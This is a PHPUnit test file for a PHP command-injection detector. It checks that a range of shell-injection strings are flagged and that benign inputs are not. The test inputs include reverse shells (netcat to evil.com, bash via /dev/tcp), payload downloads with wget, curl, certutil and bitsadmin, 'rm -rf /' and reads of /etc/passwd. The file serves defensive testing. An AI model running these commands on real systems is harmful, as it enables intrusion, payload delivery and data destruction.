<?php

declare(strict_types=1);

namespace AdosLabs\EnterpriseSecurityShield\Tests\Unit\Detection;

use AdosLabs\EnterpriseSecurityShield\Detection\CommandInjectionDetector;
use PHPUnit\Framework\TestCase;

/**
 * @covers \AdosLabs\EnterpriseSecurityShield\Detection\CommandInjectionDetector
 */
final class CommandInjectionDetectorTest extends TestCase
{
    private CommandInjectionDetector $detector;

    protected function setUp(): void
    {
        $this->detector = new CommandInjectionDetector();
    }

    // =========================================================================
    // SHELL METACHARACTER TESTS
    // =========================================================================

    public function testDetectsSemicolonInjection(): void
    {
        $result = $this->detector->detect('filename; cat /etc/passwd');

        $this->assertTrue($result['detected']);
        $this->assertContains('semicolon', $result['dangerous_patterns']);
    }

    public function testDetectsPipeInjection(): void
    {
        $result = $this->detector->detect('input | cat /etc/passwd');

        $this->assertTrue($result['detected']);
        $this->assertContains('pipe', $result['dangerous_patterns']);
    }

    public function testDetectsBacktickInjection(): void
    {
        $result = $this->detector->detect('file`whoami`.txt');

        $this->assertTrue($result['detected']);
        $this->assertContains('backtick', $result['dangerous_patterns']);
    }

    public function testDetectsCommandSubstitution(): void
    {
        $result = $this->detector->detect('file$(id).txt');

        $this->assertTrue($result['detected']);
        $this->assertContains('substitution', $result['dangerous_patterns']);
    }

    public function testDetectsNullByteInjection(): void
    {
        $result = $this->detector->detect("file.txt\x00.jpg");

        $this->assertTrue($result['detected']);
        $this->assertContains('null_byte', $result['dangerous_patterns']);
    }

    public function testDetectsNewlineInjection(): void
    {
        $result = $this->detector->detect("input\ncat /etc/passwd");

        $this->assertTrue($result['detected']);
        $this->assertContains('newline', $result['dangerous_patterns']);
    }

    // =========================================================================
    // COMMAND CHAINING TESTS
    // =========================================================================

    public function testDetectsAndChaining(): void
    {
        $result = $this->detector->detect('echo hello && cat /etc/passwd');

        $this->assertTrue($result['detected']);
        $this->assertContains('&&', $result['dangerous_patterns']);
    }

    public function testDetectsOrChaining(): void
    {
        $result = $this->detector->detect('false || cat /etc/passwd');

        $this->assertTrue($result['detected']);
        $this->assertContains('||', $result['dangerous_patterns']);
    }

    // =========================================================================
    // DANGEROUS COMMAND TESTS
    // =========================================================================

    public function testDetectsWget(): void
    {
        $result = $this->detector->detect('wget http://evil.com/shell.sh');

        $this->assertTrue($result['detected']);
        $this->assertContains('wget', $result['commands_found']);
    }

    public function testDetectsCurl(): void
    {
        $result = $this->detector->detect('curl http://evil.com/payload');

        $this->assertTrue($result['detected']);
        $this->assertContains('curl', $result['commands_found']);
    }

    public function testDetectsNetcat(): void
    {
        $result = $this->detector->detect('nc -e /bin/sh evil.com 4444');

        $this->assertTrue($result['detected']);
        $this->assertContains('nc', $result['commands_found']);
        $this->assertGreaterThanOrEqual(90, $result['confidence']);
    }

    public function testDetectsBash(): void
    {
        $result = $this->detector->detect("bash -c 'cat /etc/passwd'");

        $this->assertTrue($result['detected']);
        $this->assertContains('bash', $result['commands_found']);
    }

    public function testDetectsPython(): void
    {
        $result = $this->detector->detect("python -c 'import os; os.system(\"id\")'");

        $this->assertTrue($result['detected']);
        $this->assertContains('python', $result['commands_found']);
    }

    public function testDetectsPerl(): void
    {
        $result = $this->detector->detect("perl -e 'exec \"/bin/sh\"'");

        $this->assertTrue($result['detected']);
        $this->assertContains('perl', $result['commands_found']);
    }

    public function testDetectsRm(): void
    {
        $result = $this->detector->detect('rm -rf /');

        $this->assertTrue($result['detected']);
        $this->assertContains('rm', $result['commands_found']);
    }

    public function testDetectsChmod(): void
    {
        $result = $this->detector->detect('chmod 777 /etc/passwd');

        $this->assertTrue($result['detected']);
        $this->assertContains('chmod', $result['commands_found']);
    }

    // =========================================================================
    // WINDOWS COMMAND TESTS
    // =========================================================================

    public function testDetectsCmdExe(): void
    {
        $result = $this->detector->detect('cmd.exe /c dir');

        $this->assertTrue($result['detected']);
        $this->assertContains('cmd.exe', $result['commands_found']);
    }

    public function testDetectsPowershell(): void
    {
        $result = $this->detector->detect('powershell -ExecutionPolicy Bypass -File script.ps1');

        $this->assertTrue($result['detected']);
        $this->assertContains('powershell', $result['commands_found']);
        $this->assertGreaterThanOrEqual(90, $result['confidence']);
    }

    public function testDetectsCertutil(): void
    {
        $result = $this->detector->detect('certutil -urlcache -split -f http://evil.com/shell.exe');

        $this->assertTrue($result['detected']);
        $this->assertContains('certutil', $result['commands_found']);
    }

    public function testDetectsBitsadmin(): void
    {
        $result = $this->detector->detect('bitsadmin /transfer job http://evil.com/payload c:\\payload.exe');

        $this->assertTrue($result['detected']);
        $this->assertContains('bitsadmin', $result['commands_found']);
    }

    // =========================================================================
    // REVERSE SHELL PATTERNS
    // =========================================================================

    public function testDetectsDevTcpReverseShell(): void
    {
        $result = $this->detector->detect('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1');

        $this->assertTrue($result['detected']);
        $this->assertContains('dev_tcp', $result['dangerous_patterns']);
        $this->assertGreaterThanOrEqual(95, $result['confidence']);
    }

    public function testDetectsBase64ShellExecution(): void
    {
        $result = $this->detector->detect("echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash");

        $this->assertTrue($result['detected']);
        $this->assertContains('b64_shell', $result['dangerous_patterns']);
        $this->assertGreaterThanOrEqual(95, $result['confidence']);
    }

    // =========================================================================
    // SENSITIVE FILE ACCESS
    // =========================================================================

    public function testDetectsSensitiveFileRedirection(): void
    {
        $result = $this->detector->detect('< /etc/passwd');

        $this->assertTrue($result['detected']);
        $this->assertContains('sensitive_file_redirect', $result['dangerous_patterns']);
    }

    public function testDetectsEnvFileAccess(): void
    {
        $result = $this->detector->detect('cat < .env');

        $this->assertTrue($result['detected']);
    }

    // =========================================================================
    // ENCODING BYPASS TESTS
    // =========================================================================

    public function testDetectsUrlEncodedPayload(): void
    {
        $result = $this->detector->detect('file%3Bcat%20/etc/passwd'); // ;cat /etc/passwd

        $this->assertTrue($result['detected']);
    }

    public function testDetectsDoubleUrlEncodedPayload(): void
    {
        $result = $this->detector->detect('file%253Bcat%2520/etc/passwd');

        $this->assertTrue($result['detected']);
    }

    public function testDetectsUnicodeEscapedPayload(): void
    {
        $result = $this->detector->detect('file\\u003Bcat /etc/passwd'); // ; in unicode

        $this->assertTrue($result['detected']);
    }

    public function testDetectsHexEscapedPayload(): void
    {
        $result = $this->detector->detect('file\\x3Bcat /etc/passwd'); // ; in hex

        $this->assertTrue($result['detected']);
    }

    // =========================================================================
    // FALSE POSITIVE TESTS
    // =========================================================================

    public function testDoesNotDetectNormalFilename(): void
    {
        $result = $this->detector->detect('document.pdf');

        $this->assertFalse($result['detected']);
    }

    public function testDoesNotDetectNormalText(): void
    {
        $result = $this->detector->detect('Hello World');

        $this->assertFalse($result['detected']);
    }

    public function testDoesNotDetectNormalEmail(): void
    {
        $result = $this->detector->detect('user@example.com');

        $this->assertFalse($result['detected']);
    }

    public function testDoesNotDetectNormalUrl(): void
    {
        $result = $this->detector->detect('https://example.com/page');

        // URLs should have low confidence as they contain special chars
        // but should not be flagged as injection
        $this->assertLessThan(70, $result['confidence']);
    }

    // =========================================================================
    // QUICK CHECK TESTS
    // =========================================================================

    public function testIsInjectionReturnsTrueForInjection(): void
    {
        $this->assertTrue($this->detector->isInjection('; cat /etc/passwd'));
    }

    public function testIsInjectionReturnsFalseForSafeInput(): void
    {
        $this->assertFalse($this->detector->isInjection('normal input'));
    }

    // =========================================================================
    // THRESHOLD TESTS
    // =========================================================================

    public function testHighThresholdReducesDetection(): void
    {
        $detector = new CommandInjectionDetector(0.95);

        // Lower confidence attacks may not be detected
        $result = $detector->detect('cat file.txt');

        // With high threshold, simple commands may not trigger
        $this->assertIsBool($result['detected']);
    }

    public function testLowThresholdIncreasesDetection(): void
    {
        $detector = new CommandInjectionDetector(0.3);

        $result = $detector->detect('file > output.txt');

        // With low threshold, more things are flagged
        $this->assertTrue($result['detected']);
    }

    // =========================================================================
    // RISK LEVEL TESTS
    // =========================================================================

    public function testCriticalRiskForReverseShell(): void
    {
        $result = $this->detector->detect('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');

        $this->assertEquals('CRITICAL', $result['risk_level']);
    }

    public function testHighRiskForNetcat(): void
    {
        $result = $this->detector->detect('nc evil.com 4444');

        $this->assertContains($result['risk_level'], ['HIGH', 'CRITICAL']);
    }
}
